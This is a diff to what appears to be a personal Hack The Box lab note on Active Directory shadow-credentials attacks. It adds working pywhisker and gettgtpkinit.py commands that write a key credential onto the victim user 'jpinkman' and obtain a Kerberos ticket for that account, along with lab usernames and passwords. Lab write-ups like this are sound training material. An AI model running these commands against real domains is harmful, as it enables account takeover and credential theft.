@@ -26,3 +26,18 @@ Lazarus2858@htb[/htb]$ impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -j
 ```
 
 One Can also use `Bloodhound` with the `AddKeyCredentialLink` that will indicate that one user has write permissions over another user's `msDS-KeyCredentialLink` attribute, allowing them to take control of the user.
+
+Next one can perform this attack from a linux system. Writing a `X.509 certificate` and making a public key to the victims user `msDS-KeyCredentialLink`.
+[PyWhisker](https://github.com/ShutdownRepo/pywhisker.git)
+Attacking the user `jpinkman`.
+```python
+pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
+
+# Accessing the ticket
+python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
+
+# Then using the same commands to export the data with klist.
+Lazarus2858@htb[/htb]$ export KRB5CCNAME=/tmp/jpinkman.ccache
+Lazarus2858@htb[/htb]$ klist
+```
+
